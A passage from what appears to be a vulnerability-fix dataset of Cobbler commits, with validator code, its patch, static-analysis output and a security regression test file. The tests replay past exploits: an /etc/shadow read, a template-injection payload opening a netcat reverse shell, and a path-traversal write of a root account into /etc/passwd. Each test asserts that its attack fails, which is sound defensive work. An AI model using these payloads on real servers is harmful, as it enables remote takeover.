\"\"\"\n    For Virt only.\n    Specifies whether the VM should automatically boot upon host reboot 0 tells Koan not to auto_boot virtuals.\n\n    :param value: May be True or False.\n    \"\"\"\n    value = utils.input_boolean(value)\n    if not isinstance(value, bool):\n        raise TypeError(\"virt_auto_boot needs to be of type bool.\")\n    return value\n\n\ndef validate_virt_pxe_boot(value: bool) -> bool:\n    \"\"\"\n    For Virt only.\n    Specifies whether the VM should use PXE for booting 0 tells Koan not to PXE boot virtuals\n\n    :param value: May be True or False.\n    :return: True or False\n    \"\"\"\n    value = utils.input_boolean(value)\n    if not isinstance(value, bool):\n        raise TypeError(\"virt_pxe_boot needs to be of type bool.\")\n    return value\n\n\ndef validate_virt_ram(value: Union[int, str]) -> Union[str, int]:\n    \"\"\"\n    For Virt only.\n    Specifies the size of the Virt RAM in MB.\n\n    :param value: 0 tells Koan to just choose a reasonable default.\n    :returns: An integer in all cases, except when ``value`` is the magic inherit string.\n    \"\"\"\n    if not isinstance(value, (str, int)):\n        raise TypeError(\"virt_ram must be of type int or the str '<<inherit>>'!\")\n\n    if isinstance(value, str):\n        if value == enums.VALUE_INHERITED:\n            # FIXME: The default value is 0 instead of enums.VALUE_INHERITED.\n            return enums.VALUE_INHERITED\n        if value == \"\":\n            return 0\n        if not utils.is_str_int(value):\n            raise TypeError(\"virt_ram needs to be an integer\")\n        value = int(value)\n\n    # value is a non-negative integer (0 means default)\n    interger_number = int(value)\n    if interger_number < 0:\n        raise ValueError(\"The virt_ram needs to have a value greater or equal to zero. Zero means default RAM.\"\n                         % str(value))\n    return interger_number\n\n\ndef validate_virt_type(vtype: Union[enums.VirtType, str]):\n    \"\"\"\n    Virtualization preference, can be overridden by koan.\n\n    :param vtype: May be one of \"qemu\", \"kvm\", \"xenpv\", \"xenfv\", \"vmware\", \"vmwarew\", \"openvz\" or \"auto\"\n    \"\"\"\n    if not isinstance(vtype, (str, enums.VirtType)):\n        raise TypeError(\"driver needs to be of type str or enums.VirtDiskDrivers\")\n    # Convert an arch which came in as a string\n    if isinstance(vtype, str):\n        if vtype == enums.VALUE_INHERITED:\n            return enums.VALUE_INHERITED\n        try:\n            vtype = enums.VirtType[vtype.upper()]\n        except KeyError as error:\n            raise ValueError(\"vtype choices include: %s\" % list(map(str, enums.VirtType))) from error\n    # Now it must be of the enum Type\n    if vtype not in enums.VirtType:\n        raise ValueError(\"invalid virt type (%s)\" % vtype)\n    return vtype\n\n\ndef validate_virt_bridge(vbridge: str) -> str:\n    \"\"\"\n    The default bridge for all virtual interfaces under this profile.\n\n    :param vbridge: The bridgename to set for the object.\n    :raises TypeError: In case vbridge was not of type str.\n    \"\"\"\n    if not isinstance(vbridge, str):\n        raise TypeError(\"vbridge must be of type str.\")\n    # FIXME: Settings are not available here\n    if not vbridge:\n        return \"\"\n    return vbridge\n\n\ndef validate_virt_path(path: str, for_system: bool = False):\n    \"\"\"\n    Virtual storage location suggestion, can be overriden by koan.\n\n    :param path: The path to the storage.\n    :param for_system: If this is set to True then the value is inherited from a profile.\n    \"\"\"\n    if not isinstance(path, str):\n        raise TypeError(\"Field virt_path needs to be of type str!\")\n    if for_system:\n        if path == \"\":\n            path = enums.VALUE_INHERITED\n    return path\n\n\ndef validate_virt_cpus(num: Union[str, int]) -> int:\n    \"\"\"\n    For Virt only. Set the number of virtual CPUs to give to the virtual machine. This is fed to virtinst RAW, so\n    Cobbler will not yelp if you try to feed it 9999 CPUs. No formatting like 9,999 please :)\n\n    Zero means that the number of cores is inherited. Negative numbers are forbidden\n\n    :param num: The number of cpu cores. If you pass the magic inherit string it will be converted to 0.\n    \"\"\"\n    if isinstance(num, str):\n        if num == enums.VALUE_INHERITED:\n            return 0\n        if num == \"\":\n            return 0\n        if not utils.is_str_int(num):\n            raise TypeError(\"virt_cpus needs to be an integer\")\n        num = int(num)\n    if not isinstance(num, int):\n        raise TypeError(\"virt_cpus needs to be an integer\")\n    if num < 0:\n        raise ValueError(\"virt_cpus needs to be 0 or greater\")\n    return int(num)\n\n\ndef validate_serial_device(value: Union[str, int]) -> int:\n    \"\"\"\n    Set the serial device for an object.\n\n    :param value: The number of the serial device.\n    :return: The validated device number\n    \"\"\"\n    if isinstance(value, str):\n        if not utils.is_str_int(value):\n            raise TypeError(\"serial_device needs to be an integer\")\n        value = int(value)\n    if not isinstance(value, int):\n        raise TypeError(\"serial_device needs to be an integer\")\n    if value < 0:\n        raise ValueError(\"serial_device needs to be 0 or greater\")\n    return int(value)\n\n\ndef validate_serial_baud_rate(baud_rate: Union[int, str, enums.BaudRates]) -> enums.BaudRates:\n    \"\"\"\n    The baud rate is very import that the communication between the two devices can be established correctly. This is\n    the setter for this parameter. This effectively is the speed of the connection.\n\n    :param baud_rate: The baud rate to set.\n    :return: The validated baud rate.\n    \"\"\"\n    if not isinstance(baud_rate, (int, str, enums.BaudRates)):\n        raise TypeError(\"serial baud rate needs to be of type int or enums.BaudRates\")\n    # Convert the baud rate which came in as an int or str\n    if isinstance(baud_rate, (int, str)):\n        try:\n            baud_rate = enums.BaudRates[\"B\" + str(baud_rate)]\n        except KeyError as key_error:\n            raise ValueError(\"vtype choices include: %s\" % list(map(str, enums.BaudRates))) from key_error\n    # Now it must be of the enum Type\n    if baud_rate not in enums.BaudRates:\n        raise ValueError(\"invalid value for serial baud Rate (%s)\" % baud_rate)\n    return baud_rate\n\n\ndef validate_boot_remote_file(value: str) -> bool:\n    \"\"\"\n    This validates if the passed value is a valid value for ``remote_boot_{kernel,initrd}``.\n\n    :param value: Must be a valid URI starting with http or tftp. ftp is not supported and thus invalid.\n    :return: False in any case. If value is valid, ``True`` is returned.\n    \"\"\"\n    if not isinstance(value, str):\n        return False\n    parsed_url = urlparse(value)\n    # Check that it starts with http / tftp\n    if parsed_url.scheme not in (\"http\", \"tftp\"):\n        return False\n    # Check the port\n    # FIXME: Allow ports behind the hostname and check if they are allowed\n    # Check we have magic @@server@@\n    if parsed_url.netloc.startswith(\"@@\") and parsed_url.netloc.endswith(\"server@@\"):\n        return True\n    # If not magic @@server@@ then assume IPv4/v6\n    if netaddr.valid_ipv4(parsed_url.netloc) or netaddr.valid_ipv6(parsed_url.netloc):\n        return True\n    # If not magic or IPv4/v6 then it must be a valid hostname\n    # To check that we remove the protocol and get then everything to the first slash\n    host = value[7:].split(\"/\", 1)[0]\n    if RE_URL.match(host):\n        return True\n    return False\n\n\ndef validate_grub_remote_file(value: str) -> bool:\n    \"\"\"\n    This validates if the passed value is a valid value for ``remote_grub_{kernel,initrd}``.\n\n    :param value: Must be a valid grub formatted URI starting with http or tftp. ftp is not supported and thus invalid.\n    :return: False in any case. If value is valid, ``True`` is returned.\n    \"\"\"\n    if not isinstance(value, str):\n        return False\n    # Format: \"(%s,%s)/%s\" % (prot, server, path)\n    grub_match_result = RE_URL_GRUB.match(value)\n    success = False\n    if grub_match_result:\n        # grub_match_result.group(\"protocol\") -> No further processing needing if the match is there.\n        server = grub_match_result.group(\"server\")\n        # FIXME: Disallow invalid port specifications in the URL\n        success_server_ip = (netaddr.valid_ipv4(server) or netaddr.valid_ipv6(server))\n        # FIXME: Disallow invalid URLs (e.g.: underscore in URL)\n        success_server_name = urlparse(\"https://%s\" % server).netloc == server\n        path = grub_match_result.group(\"path\")\n        success_path = urlparse(\"https://fake.local/%s\" % path).path[1:] == path\n        success = (success_server_ip or success_server_name) and success_path\n    return success\n\n\ndef validate_autoinstall_script_name(name: str) -> bool:\n    \"\"\"\n    This validates if the name given for the script is valid in the context of the API call made. It will be handed to\n    tftpgen.py#generate_script in the end.\n\n    :param name: The name of the script. Will end up being a filename. May have an extension but should never be a path.\n    :return: If this is a valid script name or not.\n    \"\"\"\n    if not isinstance(name, str):\n        return False\n    if re.fullmatch(RE_SCRIPT_NAME, name):\n        return True\n    return False\n\n\ndef validate_uuid(possible_uuid: str) -> bool:\n    \"\"\"\n    Validate if the handed string is a valid UUIDv4.\n\n    :param possible_uuid: The str with the UUID.\n    :return: True in case it is one, False otherwise.\n    \"\"\"\n    if not isinstance(possible_uuid, str):\n        return False\n    # Taken from: https://stackoverflow.com/a/33245493/4730773\n    try:\n        uuid_obj = UUID(possible_uuid, version=4)\n    except ValueError:\n        return False\n    return str(uuid_obj) == possible_uuid\n\n\ndef validate_obj_type(object_type: str) -> bool:\n    \"\"\"\n\n    :param object_type:\n    :return:\n    \"\"\"\n    if not isinstance(object_type, str):\n        return False\n    return object_type in [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]\n\n\ndef validate_obj_name(object_name: str) -> bool:\n    \"\"\"\n\n    :param object_name:\n    :return:\n    \"\"\"\n    if not isinstance(object_name, str):\n        return False\n    return bool(re.fullmatch(item.RE_OBJECT_NAME, object_name))\n\n\ndef validate_obj_id(object_id: str) -> bool:\n    \"\"\"\n\n    :param object_id:\n    :return: True in case it is one, False otherwise.\n    \"\"\"\n    if not isinstance(object_id, str):\n        return False\n    if object_id.startswith(\"___NEW___\"):\n        object_id = object_id[9:]\n    (otype, oname) = object_id.split(\"::\", 1)\n    return validate_obj_type(otype) and validate_obj_name(oname)\n", "patch": "@@ -22,14 +22,17 @@\n from urllib.parse import urlparse\n from ipaddress import AddressValueError, NetmaskValueError\n from typing import Union\n+from uuid import UUID\n \n import netaddr\n \n from cobbler import enums, utils\n+from cobbler.items import item\n \n RE_HOSTNAME = re.compile(r'^([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])(\\.([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9]))*$')\n RE_URL_GRUB = re.compile(r\"^\\((?P<protocol>http|tftp),(?P<server>.*)\\)/(?P<path>.*)$\")\n RE_URL = re.compile(r'^[a-zA-Z\\d-]{,63}(\\.[a-zA-Z\\d-]{,63})*$')  # https://stackoverflow.com/a/2894918\n+RE_SCRIPT_NAME = re.compile(r\"[a-zA-Z0-9_\\-.]+\")\n \n # blacklist invalid values to the repo statement in autoinsts\n AUTOINSTALL_REPO_BLACKLIST = ['enabled', 'gpgcheck', 'gpgkey']\n@@ -606,3 +609,71 @@ def validate_grub_remote_file(value: str) -> bool:\n         success_path = urlparse(\"https://fake.local/%s\" % path).path[1:] == path\n         success = (success_server_ip or success_server_name) and success_path\n     return success\n+\n+\n+def validate_autoinstall_script_name(name: str) -> bool:\n+    \"\"\"\n+    This validates if the name given for the script is valid in the context of the API call made. It will be handed to\n+    tftpgen.py#generate_script in the end.\n+\n+    :param name: The name of the script. Will end up being a filename. May have an extension but should never be a path.\n+    :return: If this is a valid script name or not.\n+    \"\"\"\n+    if not isinstance(name, str):\n+        return False\n+    if re.fullmatch(RE_SCRIPT_NAME, name):\n+        return True\n+    return False\n+\n+\n+def validate_uuid(possible_uuid: str) -> bool:\n+    \"\"\"\n+    Validate if the handed string is a valid UUIDv4.\n+\n+    :param possible_uuid: The str with the UUID.\n+    :return: True in case it is one, False otherwise.\n+    \"\"\"\n+    if not isinstance(possible_uuid, str):\n+        return False\n+    # Taken from: https://stackoverflow.com/a/33245493/4730773\n+    try:\n+        uuid_obj = UUID(possible_uuid, version=4)\n+    except ValueError:\n+        return False\n+    return str(uuid_obj) == possible_uuid\n+\n+\n+def validate_obj_type(object_type: str) -> bool:\n+    \"\"\"\n+\n+    :param object_type:\n+    :return:\n+    \"\"\"\n+    if not isinstance(object_type, str):\n+        return False\n+    return object_type in [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]\n+\n+\n+def validate_obj_name(object_name: str) -> bool:\n+    \"\"\"\n+\n+    :param object_name:\n+    :return:\n+    \"\"\"\n+    if not isinstance(object_name, str):\n+        return False\n+    return bool(re.fullmatch(item.RE_OBJECT_NAME, object_name))\n+\n+\n+def validate_obj_id(object_id: str) -> bool:\n+    \"\"\"\n+\n+    :param object_id:\n+    :return: True in case it is one, False otherwise.\n+    \"\"\"\n+    if not isinstance(object_id, str):\n+        return False\n+    if object_id.startswith(\"___NEW___\"):\n+        object_id = object_id[9:]\n+    (otype, oname) = object_id.split(\"::\", 1)\n+    return validate_obj_type(otype) and validate_obj_name(oname)", "file_path": "files/2021_10/1108", "file_language": "py", "file_name": "cobbler/validate.py", "outdated_file_modify": 0, "outdated_file_before": 0, "outdated_file_after": 0, "llm_check": 0, "static_check": 1, "static": {"rats": [true, ["/data/rdhu/other/Static/tmp/2021_10_1108.py:32: High: compile\nRE_HOSTNAME = re.compile(r'^([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])(\\.([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9]))*$')\nArgument 1 to this function call should be checked to ensure that it does not\ncome from an untrusted source without first verifying that it contains nothing\ndangerous.", "/data/rdhu/other/Static/tmp/2021_10_1108.py:33: High: compile\nRE_URL_GRUB = re.compile(r\"^\\((?P<protocol>http|tftp),(?P<server>.*)\\)/(?P<path>.*)$\")\nArgument 1 to this function call should be checked to ensure that it does not\ncome from an untrusted source without first verifying that it contains nothing\ndangerous.", "/data/rdhu/other/Static/tmp/2021_10_1108.py:34: High: compile\nRE_URL = re.compile(r'^[a-zA-Z\\d-]{,63}(\\.[a-zA-Z\\d-]{,63})*$')  # https://stackoverflow.com/a/2894918\nArgument 1 to this function call should be checked to ensure that it does not\ncome from an untrusted source without first verifying that it contains nothing\ndangerous.", "/data/rdhu/other/Static/tmp/2021_10_1108.py:35: High: compile\nRE_SCRIPT_NAME = re.compile(r\"[a-zA-Z0-9_\\-.]+\")\nArgument 1 to this function call should be checked to ensure that it does not\ncome from an untrusted source without first verifying that it contains nothing\ndangerous."]], "semgrep": [false, []]}, "target": -1, "function_before": [], "function_after": []}, {"raw_url": "https://github.com/cobbler/cobbler/raw/d8f60bbf14a838c8c8a1dba98086b223e35fe70a/tests%2Fconftest.py", "code": "import logging\nimport os\nimport shutil\nfrom contextlib import contextmanager\nfrom pathlib import Path\n\nimport pytest\n\n\ndef pytest_addoption(parser):\n    parser.addoption(\"-E\", action=\"store\", metavar=\"NAME\", help=\"only run tests matching the environment NAME.\")\n\n\ndef pytest_configure(config):\n    # register an additional marker\n    config.addinivalue_line(\"markers\", \"env(name): mark test to run only on named environment\")\n\n\n@contextmanager\ndef does_not_raise():\n    yield\n\n\n@pytest.fixture(scope=\"function\")\ndef create_testfile(tmp_path):\n    def _create_testfile(filename):\n        path = os.path.join(tmp_path, filename)\n        if not os.path.exists(path):\n            Path(path).touch()\n        return path\n    return _create_testfile\n\n\n@pytest.fixture(scope=\"function\")\ndef create_kernel_initrd(create_testfile):\n    def _create_kernel_initrd(name_kernel, name_initrd):\n        create_testfile(name_kernel)\n        return os.path.dirname(create_testfile(name_initrd))\n    return _create_kernel_initrd\n\n\n@pytest.fixture(scope=\"session\", autouse=True)\ndef cleanup_leftover_items():\n    \"\"\"\n    Will delete all JSON files which are left in Cobbler before a testrun!\n    \"\"\"\n    logger = logging.getLogger(\"session-cleanup\")\n    cobbler_collections = [\"distros\", \"files\", \"images\", \"menus\", \"mgmtclasses\", \"packages\", \"profiles\", \"repos\",\n                           \"systems\"]\n    for collection in cobbler_collections:\n        path = os.path.join(\"/var/lib/cobbler/collections\", collection)\n        for file in os.listdir(path):\n            json_file = os.path.join(path, file)\n            os.remove(json_file)\n            logger.info(\"Removed file: \" + json_file)\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_initrd():\n    \"\"\"\n    The path to the first fake initrd.\n\n    :return: A filename as a string.\n    \"\"\"\n    return \"initrd1.img\"\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_initrd2():\n    \"\"\"\n    The path to the second fake initrd.\n\n    :return: A filename as a string.\n    \"\"\"\n    return \"initrd2.img\"\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_initrd3():\n    \"\"\"\n    The path to the third fake initrd.\n\n    :return: A path as a string.\n    \"\"\"\n    return \"initrd3.img\"\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_kernel():\n    \"\"\"\n    The path to the first fake kernel.\n\n    :return: A path as a string.\n    \"\"\"\n    return \"vmlinuz1\"\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_kernel2():\n    \"\"\"\n    The path to the second fake kernel.\n\n    :return: A path as a string.\n    \"\"\"\n    return \"vmlinuz2\"\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_kernel3():\n    \"\"\"\n    The path to the third fake kernel.\n\n    :return: A path as a string.\n    \"\"\"\n    return \"vmlinuz3\"\n\n\n@pytest.fixture(scope=\"function\")\ndef redhat_autoinstall():\n    \"\"\"\n    The path to the test.ks file for redhat autoinstall.\n\n    :return: A path as a string.\n    \"\"\"\n    return \"test.ks\"\n\n\n@pytest.fixture(scope=\"function\")\ndef suse_autoyast():\n    \"\"\"\n    The path to the suse autoyast xml-file.\n    :return: A path as a string.\n    \"\"\"\n    return \"test.xml\"\n\n\n@pytest.fixture(scope=\"function\")\ndef ubuntu_preseed():\n    \"\"\"\n    The path to the ubuntu preseed file.\n    :return: A path as a string.\n    \"\"\"\n    return \"test.seed\"\n", "code_before": "import logging\nimport os\nimport shutil\nfrom contextlib import contextmanager\nfrom pathlib import Path\n\nimport pytest\n\n\ndef pytest_addoption(parser):\n    parser.addoption(\"-E\", action=\"store\", metavar=\"NAME\", help=\"only run tests matching the environment NAME.\")\n\n\ndef pytest_configure(config):\n    # register an additional marker\n    config.addinivalue_line(\"markers\", \"env(name): mark test to run only on named environment\")\n\n\n@contextmanager\ndef does_not_raise():\n    yield\n\n\n@pytest.fixture(scope=\"function\")\ndef create_testfile(tmp_path):\n    def _create_testfile(filename):\n        path = os.path.join(tmp_path, filename)\n        if not os.path.exists(path):\n            Path(path).touch()\n        return path\n    return _create_testfile\n\n\n@pytest.fixture(scope=\"function\")\ndef create_kernel_initrd(create_testfile):\n    def _create_kernel_initrd(name_kernel, name_initrd):\n        create_testfile(name_kernel)\n        return os.path.dirname(create_testfile(name_initrd))\n    return _create_kernel_initrd\n\n\n@pytest.fixture(scope=\"session\", autouse=True)\ndef cleanup_leftover_items():\n    \"\"\"\n    Will delete all JSON files which are left in Cobbler before a testrun!\n    \"\"\"\n    logger = logging.getLogger(\"session-cleanup\")\n    cobbler_collections = [\"distros\", \"files\", \"images\", \"menus\", \"mgmtclasses\", \"packages\", \"profiles\", \"repos\",\n                           \"systems\"]\n    for collection in cobbler_collections:\n        path = os.path.join(\"/var/lib/cobbler/collections\", collection)\n        for file in os.listdir(path):\n            json_file = os.path.join(path, file)\n            os.remove(json_file)\n            logger.info(\"Removed file: \" + json_file)\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_initrd():\n    \"\"\"\n    The path to the first fake initrd.\n\n    :return: A filename as a string.\n    \"\"\"\n    return \"initrd1.img\"\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_initrd2():\n    \"\"\"\n    The path to the second fake initrd.\n\n    :return: A filename as a string.\n    \"\"\"\n    return \"initrd2.img\"\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_initrd3():\n    \"\"\"\n    The path to the third fake initrd.\n\n    :return: A path as a string.\n    \"\"\"\n    return \"initrd3.img\"\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_kernel():\n    \"\"\"\n    The path to the first fake kernel.\n\n    :return: A path as a string.\n    \"\"\"\n    return \"vmlinuz1\"\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_kernel2():\n    \"\"\"\n    The path to the second fake kernel.\n\n    :return: A path as a string.\n    \"\"\"\n    return \"vmlinuz2\"\n\n\n@pytest.fixture(scope=\"function\")\ndef fk_kernel3():\n    \"\"\"\n    The path to the third fake kernel.\n\n    :return: A path as a string.\n    \"\"\"\n    return \"vmlinuz3\"\n\n\n@pytest.fixture(scope=\"function\")\ndef redhat_autoinstall():\n    \"\"\"\n    The path to the test.ks file for redhat autoinstall.\n\n    :return: A path as a string.\n    \"\"\"\n    return \"test.ks\"\n\n\n@pytest.fixture(scope=\"function\")\ndef suse_autoyast():\n    \"\"\"\n    The path to the suse autoyast xml-file.\n    :return: A path as a string.\n    \"\"\"\n    return \"test.xml\"\n\n\n@pytest.fixture(scope=\"function\")\ndef ubuntu_preseed():\n    \"\"\"\n    The path to the ubuntu preseed file.\n    :return: A path as a string.\n    \"\"\"\n    return \"test.seed\"\n", "patch": "@@ -54,6 +54,7 @@ def cleanup_leftover_items():\n             os.remove(json_file)\n             logger.info(\"Removed file: \" + json_file)\n \n+\n @pytest.fixture(scope=\"function\")\n def fk_initrd():\n     \"\"\"", "file_path": "files/2021_10/1110", "file_language": "py", "file_name": "tests/conftest.py", "outdated_file_modify": 1, "outdated_file_before": 0, "outdated_file_after": 0, "llm_check": 0, "static_check": 0, "static": {"rats": [false, []], "semgrep": [false, []]}, "target": 0, "function_before": [{"function": "def pytest_addoption(parser):\n    parser.addoption(\"-E\", action=\"store\", metavar=\"NAME\", help=\"only run tests matching the environment NAME.\")", "target": 0}, {"function": "def pytest_configure(config):\n    # register an additional marker\n    config.addinivalue_line(\"markers\", \"env(name): mark test to run only on named environment\")", "target": 0}], "function_after": [{"function": "def pytest_addoption(parser):\n    parser.addoption(\"-E\", action=\"store\", metavar=\"NAME\", help=\"only run tests matching the environment NAME.\")", "target": 0}, {"function": "def pytest_configure(config):\n    # register an additional marker\n    config.addinivalue_line(\"markers\", \"env(name): mark test to run only on named environment\")", "target": 0}]}, {"raw_url": "https://github.com/cobbler/cobbler/raw/d8f60bbf14a838c8c8a1dba98086b223e35fe70a/tests%2Fspecial_cases%2Fsecurity_test.py", "code": "\"\"\"\nThis test module tries to automatically replicate all security incidents we had in the past and checks if they fail.\n\"\"\"\n# SPDX-License-Identifier: GPL-2.0-or-later\nimport base64\nimport os\nimport xmlrpc.client\n\nimport pytest\n\nfrom cobbler.utils import get_shared_secret\n\n\n# ==================== Start tnpconsultants ====================\n\n# SPDX-FileCopyrightText: 2021 Nicolas Chatelain <nicolas.chatelain@tnpconsultants.com>\n\n\n@pytest.fixture\ndef try_connect():\n    def try_connect(url) -> xmlrpc.client.ServerProxy:\n        xmlrpc_server = xmlrpc.client.ServerProxy(url)\n        return xmlrpc_server\n    return try_connect\n\n\n@pytest.fixture(autouse=True)\ndef setup_profile(try_connect, create_kernel_initrd, fk_kernel, fk_initrd):\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n    shared_secret = get_shared_secret()\n    token = cobbler_api.login(\"\", shared_secret)\n    folder = create_kernel_initrd(fk_kernel, fk_initrd)\n    kernel_path = os.path.join(folder, fk_kernel)\n    initrd_path = os.path.join(folder, fk_kernel)\n    # Create a test Distro\n    distro = cobbler_api.new_distro(token)\n    cobbler_api.modify_distro(distro, \"name\", \"security_test_distro\", token)\n    cobbler_api.modify_distro(distro, \"arch\", \"x86_64\", token)\n    cobbler_api.modify_distro(distro, \"kernel\", str(kernel_path), token)\n    cobbler_api.modify_distro(distro, \"initrd\", str(initrd_path), token)\n    cobbler_api.save_distro(distro, token)\n    # Create a test Profile\n    profile = cobbler_api.new_profile(token)\n    cobbler_api.modify_profile(profile, \"name\", \"security_test_profile\", token)\n    cobbler_api.modify_profile(profile, \"distro\", \"security_test_distro\", token)\n    cobbler_api.save_profile(profile, token)\n\n    yield\n\n    cobbler_api.remove_profile(\"security_test_profile\", token)\n    cobbler_api.remove_distro(\"security_test_distro\", token)\n\n\ndef test_arbitrary_file_disclosure_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        result = cobbler_api.generate_script(target, \"\", \"/etc/shadow\")\n\n        # Assert this NOT succeeds\n        assert not result.startswith(\"root\")\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString\n\n\ndef test_template_injection_1(setup_profile, try_connect):\n    # Arrange\n    exploitcode = '__import__(\\'os\\').system(\\'nc [tnpitsecurity] 4242 -e /bin/sh\\')'\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        print(\"[+] Stage 1 : Poisoning log with Cheetah template RCE\")\n        result_stage_1 = cobbler_api.generate_script(target, \"\", '{<%= ' + exploitcode + ' %>}')\n        print(\"[+] Stage 2 : Rendering template using an arbitrary file read.\")\n        result_stage_2 = cobbler_api.generate_script(target, \"\", \"/var/log/cobbler/cobbler.log\")\n\n        # Assert this NOT succeeds\n        assert not result_stage_1.startswith(\"__import__\")\n        # We should never get to stage two\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString\n\n\ndef test_arbitrary_file_write_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n    exploit = b\"cha:!:0:0:cha:/:/bin/bash\\n\"\n\n    # Act\n    result = cobbler_api.upload_log_data(\n        \"../../../../../../etc\",\n        \"passwd\",\n        len(exploit),\n        100000,\n        base64.b64encode(exploit)\n    )\n\n    # Assert this NOT succeeds\n    assert result is False\n\n# ==================== END tnpconsultants ====================\n", "code_before": "\"\"\"\nThis test module tries to automatically replicate all security incidents we had in the past and checks if they fail.\n\"\"\"\n# SPDX-License-Identifier: GPL-2.0-or-later\nimport base64\nimport os\nimport xmlrpc.client\n\nimport pytest\n\nfrom cobbler.utils import get_shared_secret\n\n\n# ==================== Start tnpconsultants ====================\n\n# SPDX-FileCopyrightText: 2021 Nicolas Chatelain <nicolas.chatelain@tnpconsultants.com>\n\n\n@pytest.fixture\ndef try_connect():\n    def try_connect(url) -> xmlrpc.client.ServerProxy:\n        xmlrpc_server = xmlrpc.client.ServerProxy(url)\n        return xmlrpc_server\n    return try_connect\n\n\n@pytest.fixture(autouse=True)\ndef setup_profile(try_connect, create_kernel_initrd, fk_kernel, fk_initrd):\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n    shared_secret = get_shared_secret()\n    token = cobbler_api.login(\"\", shared_secret)\n    folder = create_kernel_initrd(fk_kernel, fk_initrd)\n    kernel_path = os.path.join(folder, fk_kernel)\n    initrd_path = os.path.join(folder, fk_kernel)\n    # Create a test Distro\n    distro = cobbler_api.new_distro(token)\n    cobbler_api.modify_distro(distro, \"name\", \"security_test_distro\", token)\n    cobbler_api.modify_distro(distro, \"arch\", \"x86_64\", token)\n    cobbler_api.modify_distro(distro, \"kernel\", str(kernel_path), token)\n    cobbler_api.modify_distro(distro, \"initrd\", str(initrd_path), token)\n    cobbler_api.save_distro(distro, token)\n    # Create a test Profile\n    profile = cobbler_api.new_profile(token)\n    cobbler_api.modify_profile(profile, \"name\", \"security_test_profile\", token)\n    cobbler_api.modify_profile(profile, \"distro\", \"security_test_distro\", token)\n    cobbler_api.save_profile(profile, token)\n\n    yield\n\n    cobbler_api.remove_profile(\"security_test_profile\", token)\n    cobbler_api.remove_distro(\"security_test_distro\", token)\n\n\ndef test_arbitrary_file_disclosure_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        result = cobbler_api.generate_script(target, \"\", \"/etc/shadow\")\n\n        # Assert this NOT succeeds\n        assert not result.startswith(\"root\")\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString\n\n\ndef test_template_injection_1(setup_profile, try_connect):\n    # Arrange\n    exploitcode = '__import__(\\'os\\').system(\\'nc [tnpitsecurity] 4242 -e /bin/sh\\')'\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        print(\"[+] Stage 1 : Poisoning log with Cheetah template RCE\")\n        result_stage_1 = cobbler_api.generate_script(target, \"\", '{<%= ' + exploitcode + ' %>}')\n        print(\"[+] Stage 2 : Rendering template using an arbitrary file read.\")\n        result_stage_2 = cobbler_api.generate_script(target, \"\", \"/var/log/cobbler/cobbler.log\")\n\n        # Assert this NOT succeeds\n        assert not result_stage_1.startswith(\"__import__\")\n        # We should never get to stage two\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString\n\n\ndef test_arbitrary_file_write_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n    exploit = b\"cha:!:0:0:cha:/:/bin/bash\\n\"\n\n    # Act\n    result = cobbler_api.upload_log_data(\n        \"../../../../../../etc\",\n        \"passwd\",\n        len(exploit),\n        100000,\n        base64.b64encode(exploit)\n    )\n\n    # Assert this NOT succeeds\n    assert result is False\n\n# ==================== END tnpconsultants ====================\n", "patch": "@@ -0,0 +1,112 @@\n+\"\"\"\n+This test module tries to automatically replicate all security incidents we had in the past and checks if they fail.\n+\"\"\"\n+# SPDX-License-Identifier: GPL-2.0-or-later\n+import base64\n+import os\n+import xmlrpc.client\n+\n+import pytest\n+\n+from cobbler.utils import get_shared_secret\n+\n+\n+# ==================== Start tnpconsultants ====================\n+\n+# SPDX-FileCopyrightText: 2021 Nicolas Chatelain <nicolas.chatelain@tnpconsultants.com>\n+\n+\n+@pytest.fixture\n+def try_connect():\n+    def 